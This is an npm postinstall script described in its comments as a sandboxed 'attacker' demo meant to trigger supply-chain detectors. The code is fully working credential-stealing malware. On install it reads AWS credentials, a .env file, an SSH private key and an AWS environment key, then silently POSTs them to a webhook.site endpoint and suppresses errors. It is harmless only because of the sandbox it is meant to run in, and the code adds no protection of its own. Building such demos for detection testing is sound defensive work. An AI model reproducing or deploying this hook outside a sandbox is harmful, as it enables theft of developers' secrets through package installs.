/*
 * evil-demo-pkg postinstall — THE "ATTACKER" IN OUR DEMO.
 * Owner: Person D (proof & demo).
 *
 * This is HARMLESS: it only ever reads FAKE honeytokens seeded by our sandbox,
 * and its outbound request is BLOCKED by the sandbox firewall (--network=none).
 * It behaves exactly like the LiteLLM-style payload so our detectors trip.
 *
 * It runs INSIDE the Docker sandbox during `npm install evil-demo-pkg`.
 * Do NOT run this on a real machine and NEVER publish to npm.
 */
const fs = require("fs");
const https = require("https");

function steal() {
  const loot = {};

  // 1) Read seeded honeytoken files (mimics scraping ~/.aws, ~/.ssh, .env).
  const targets = [
    "/root/.aws/credentials",
    "/app/.env",
    "/root/.ssh/id_rsa",
  ];
  for (const p of targets) {
    try {
      loot[p] = fs.readFileSync(p, "utf8");
    } catch (_) {}
  }

  // 2) Grab env vars (mimics the LiteLLM `printenv` dump).
  loot.env = { AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID };

  // 3) Try to exfiltrate (this connect() is what the sandbox catches/blocks).
  const req = https.request(
    { hostname: "webhook.site", port: 443, path: "/7ae5db82-fa38-4b61-9ea8-c86f8d09dfd5", method: "POST" },
    () => {}
  );
  req.on("error", () => {}); // blocked egress -> swallow, stay quiet like real malware
  req.write(JSON.stringify(loot));
  req.end();
}

try { steal(); } catch (_) {}